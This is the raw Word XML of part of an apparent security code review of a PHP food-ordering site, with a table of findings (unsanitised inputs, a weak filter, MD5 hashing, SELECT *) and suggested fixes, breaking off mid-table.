    <w:p w14:paraId="59CFA4DE" w14:textId="12369BD8" w:rsidR="00790807" w:rsidRPr="00292DEC" w:rsidRDefault="00582609" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This is not intended to be an exhaustive analysis as that would not provide sufficient benefit given the cost. That is why a more focused approach was taken. Meaning that when looking through a file, the main concern was logical errors and sanitation. Therefore, every query is analysed to ensure that user inputs are not being passed though unchecked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54056404" w14:textId="5650D9A4" w:rsidR="00263403" w:rsidRPr="00292DEC" w:rsidRDefault="00263403" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>A list containing the code referenced in the table below can be found in Appendix 2, 2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B03AB8" w14:textId="6B6F0658" w:rsidR="00790807" w:rsidRDefault="00790807" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="10173" w:type="dxa"/>
        <w:tblInd w:w="-5" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2410"/>
        <w:gridCol w:w="851"/>
        <w:gridCol w:w="3543"/>
        <w:gridCol w:w="3369"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DB0748" w14:paraId="2705A44C" w14:textId="724A96E0" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="010DEB44" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>File</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0E0753AB" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>Line</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A2170EF" w14:textId="60CC7FDA" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="328AFC19" w14:textId="4AE818B6" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>Solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DB0748" w14:paraId="2B5BC601" w14:textId="18F61424" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E7CAC96" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRPr="00981AE8" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FF5BA14" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="00F064F7" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRPr="00981AE8" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="336F6060" w14:textId="2336CDE0" w:rsidR="00DB0748" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="33B2A011" w14:textId="52D11EA9" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AC7DCA1" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="606800E3" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:r>
              <w:t>47</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
            <w:vMerge w:val="restart"/>
          </w:tcPr>
          <w:p w14:paraId="10F6F862" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:t>Weak sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
            <w:vMerge w:val="restart"/>
          </w:tcPr>
          <w:p w14:paraId="3B9226CA" w14:textId="7033E0B0" w:rsidR="002C1419" w:rsidRDefault="00851114" w:rsidP="00225A89">
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">This </w:t>
            </w:r>
            <w:r w:rsidR="009142E1">
              <w:t xml:space="preserve">function strips some characters from the input but is easily bypassed. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="21BA646A" w14:textId="70E6F4B6" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66B389C2" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Sqlcm_filter.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="10B8D2A9" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w14:paraId="1D76688D" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w14:paraId="6746E872" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="00225A89"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DB0748" w14:paraId="1573147A" w14:textId="265040D9" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06AB0809" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t xml:space="preserve">Login-exec.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A5FE65B" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>64</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C152DE3" w14:textId="77777777" w:rsidR="00DB0748" w:rsidRDefault="00DB0748" w:rsidP="00225A89">
            <w:r>
              <w:t>Md5 hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FD479BB" w14:textId="205A5597" w:rsidR="00DB0748" w:rsidRDefault="002C1419" w:rsidP="00225A89">
            <w:r>
              <w:t>Use unbroken hash algorithm such as SHA-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="4C46F304" w14:textId="454EDDEA" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AE550A7" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t xml:space="preserve">register -exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A5409AF" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15045186" w14:textId="37C75D7C" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>47</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61B83813" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7DA431E5" w14:textId="50021473" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="5A87A0C7" w14:textId="1F1B20DE" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58E5BD4A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t xml:space="preserve">register-exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="009B9BC0" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="002C1419"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6CB2BC62" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FF1FF2E" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EC8B618" w14:textId="3603E0CF" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="74A7C685" w14:textId="24FEA192" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="202FE2EA" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t xml:space="preserve">register -exec.php </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6820DEB5" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="002C1419"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="500CAC55" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="113C05E9" w14:textId="77777777" w:rsidR="002C1419" w:rsidRPr="00981AE8" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5789126A" w14:textId="09B9DB15" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="78884AB6" w14:textId="40944513" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6377C2D1" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Ratings-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0479B85A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4CA201CD" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="132AB835" w14:textId="4C966293" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="5CD852D4" w14:textId="68E9759C" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FA7233A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Ratings-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69FF2C54" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7D547E8F" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F51CFE4" w14:textId="0064D1E4" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="665AF6FB" w14:textId="60A13F15" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71EE7285" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="63AC3A8C" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="614EEBCB" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24FDFFFE" w14:textId="2C9EFEC6" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="234445DD" w14:textId="3F527450" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AC1E2E2" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0B29E0EE" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>67</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60A6C25B" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5944EE03" w14:textId="40B63E0D" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="70D7AC8E" w14:textId="446BD7D5" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D38ED41" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Order-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BF29268" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>71</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03E777AD" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7843F20C" w14:textId="68D83D10" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="47F648DA" w14:textId="61A9B73C" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1D03AE70" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>cart-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3147B310" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="26AD4561" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Unnecessary divulging data</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46E762D2" w14:textId="7F6E86E5" w:rsidR="002C1419" w:rsidRDefault="00582609" w:rsidP="002C1419">
            <w:r>
              <w:t>Don’t use “SELECT *”</w:t>
            </w:r>
            <w:r w:rsidR="005D4CF8">
              <w:t>. Only select the fields you intend to use</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="156A066A" w14:textId="35C6ECF4" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4E55C16A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>cart-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AE9E0C4" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>58</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="09609034" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B7D1E3D" w14:textId="0B2FCC24" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="49B83599" w14:textId="79FDDC94" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F84D8E4" w14:textId="5E844B8F" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Throughout, example in</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46816823" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Update-quantitiy.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6D84E13A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1DC15819" w14:textId="123D2CCB" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Example of good sanitisation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B04127A" w14:textId="4C0C62F5" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Implement throughout all input pages</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="2323D4B7" w14:textId="06459DC7" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3AED1D1A" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Admin/delete-category.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35824537" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61A60F7E" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Variables passed without sanitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3369" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37C28B66" w14:textId="02B5492B" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>Use “clean()” function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002C1419" w14:paraId="137804A0" w14:textId="3D6A930F" w:rsidTr="00DB0748">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2410" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30A4332B" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Admin/delete-food.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="264BC56D" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43E1A10B" w14:textId="77777777" w:rsidR="002C1419" w:rsidRDefault="002C1419" w:rsidP="002C1419">
            <w:r>
